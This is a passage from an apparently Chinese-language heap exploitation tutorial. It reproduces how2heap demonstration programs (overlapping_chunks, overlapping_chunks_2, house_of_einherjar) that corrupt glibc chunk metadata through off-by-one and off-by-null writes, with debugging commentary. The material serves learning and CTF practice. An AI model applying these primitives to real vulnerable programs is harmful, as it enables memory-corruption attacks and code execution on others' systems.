class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-8"><a href="#调试-8" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GHJ7RBMKB5Y8GMK.png"
                      alt="图片描述"
                ><br>首先申请三个堆块<code>p1_real:0x101</code>,<code>p2_real:0x101</code>,<code>p3_real:0x81</code>，这里只有申请<code>0x8</code>结尾的堆块才有下一个堆块<code>prev_size</code>的控制权，利用<code>off-by-one</code>漏洞。假设堆块<code>p1</code>读取时存在<code>off-by-one</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_V7X588ARHBXTSY8.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_W3A27VBAJ34ECCK.png"
                      alt="图片描述"
                ><br><code>free(p2)</code>后，利用<code>p1</code>的<code>off-by-one</code>漏洞将<code>chunk_p2</code>的<code>size</code>改为<code>0x180</code>，再次申请<code>0x178</code>大小的堆块，即可得到<code>p3</code>的控制权。</p>
<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">  real_size_p2 = <span class="built_in">malloc_usable_size</span>(p2);</span><br><span class="line">  real_size_p3 = <span class="built_in">malloc_usable_size</span>(p3);</span><br><span class="line">  real_size_p4 = <span class="built_in">malloc_usable_size</span>(p4);</span><br><span class="line">  real_size_p5 = <span class="built_in">malloc_usable_size</span>(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+<span class="built_in">malloc_usable_size</span>(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+<span class="built_in">malloc_usable_size</span>(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+<span class="built_in">malloc_usable_size</span>(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+<span class="built_in">malloc_usable_size</span>(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+<span class="built_in">malloc_usable_size</span>(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="built_in">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = <span class="built_in">malloc_usable_size</span>(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-9"><a href="#调试-9" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AY7EM3HWZB8HJSE.png"
                      alt="图片描述"
                ><br>首先申请5个<code>0x3e8</code>堆块，<code>p1</code>,<code>p2</code>,<code>p3</code>,<code>p4</code>,<code>p5</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K6GZGM7MWCZGCTS.png"
                      alt="图片描述"
                ><br><code>free(4)</code>后，假设<code>p1</code>存在<code>off-by-one</code>漏洞，将<code>p2</code>的<code>size</code>改为<code>0x3f0+0x3f0+0x1=0x7e1</code>大小。再次<code>free(p2)</code>将会把<code>p3</code>覆盖掉，并且会与<code>chunk_p4</code>重合，此时我们再次申请0x7d8大小的堆块即可获得chunk_p3的控制权。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = <span class="built_in">malloc_usable_size</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">		   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-10"><a href="#调试-10" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F3ZFDGEK2RFX33H.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F4BT7673NJYMD9K.png"
                      alt="图片描述"
                ><br>申请<code>a=0x41</code>，<code>b=0x101</code>两个堆块，并在栈上构建一个<code>fake_chunk</code>，并且<code>fake_chunk_fd_bk = fake_chunk_prev_size</code>，用来绕过<code>unlink</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8ZKFC6YP36TCPUC.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_69JHW2FXP62QRD8.png"
                      alt="图片描述"
                ><br>然后利用<code>off-by-null</code>漏洞将堆块<code>b</code>的<code>PREV_INUSE</code>位改为<code>0</code>，计算出堆块<code>b</code>与<code>fake_chunk</code>的距离(<code>fake_size</code>)，这里是个负数。<br> <img  
                     lazyload
                     src="/images/loading.svg"
